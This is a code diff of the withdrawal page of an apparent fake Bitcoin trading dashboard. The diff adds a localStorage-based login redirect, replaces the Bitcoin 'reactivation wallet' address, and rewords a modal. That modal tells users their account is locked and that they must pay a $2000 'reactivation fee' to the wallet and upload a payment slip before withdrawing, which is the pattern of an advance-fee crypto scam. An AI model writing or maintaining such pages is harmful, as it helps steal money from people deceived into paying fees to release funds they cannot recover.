@@ -1,6 +1,11 @@
 <!doctype html>
 <html lang="en">
 <head>
+<script>
+  if (localStorage.getItem("loggedIn") !== "true") {
+    window.location.href = "login.html";
+  }
+</script>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>BTC Trading Dashboard — Withdraw </title>
@@ -183,7 +188,7 @@
       <div style="margin-top:12px;">
         <div class="muted" style="font-size:13px;">Reactivation wallet:</div>
         <div style="color:var(--muted);font-size:13px;margin-top:8px;">
-          1FJiJUMhLu7DuCw8uGoQR2wUNP3g5mShnN
+          1DNP2MQandkhH7gMHCNxXCxKQtNwSfDcrR
 
     <input type="file" id="myFileInput" placeholder='upload payment slip' style="border: 1px solid #ccc; padding: 8px 12px; border-radius: 5px; background-color: #f0f0f0; color: #333; font-family: Arial, sans-serif;">
 </input>
@@ -204,7 +209,7 @@
       <p id="modalMessage" style="font-weight:600; color:#fff; margin-bottom:8px;">
         account locked! liquidate your locked asset and withdraw
       </p>
-      <p class="muted">This is a message shown when the withdrawal flow is blocked. pay a reactivation fee of $2000(usd)to the wallet below or contact a professional fx trader.</p>
+      <p class="muted">This is a message shown when the withdrawal flow is blocked. pay a reactivation fee of $2000(usd)to the wallet below or contact our customer support.</p>
       <div class="actions" style="display:flex;gap:8px;justify-content:flex-end;margin-top:12px;">
         <button class="btn" id="modalClose">Close</button>
       </div>
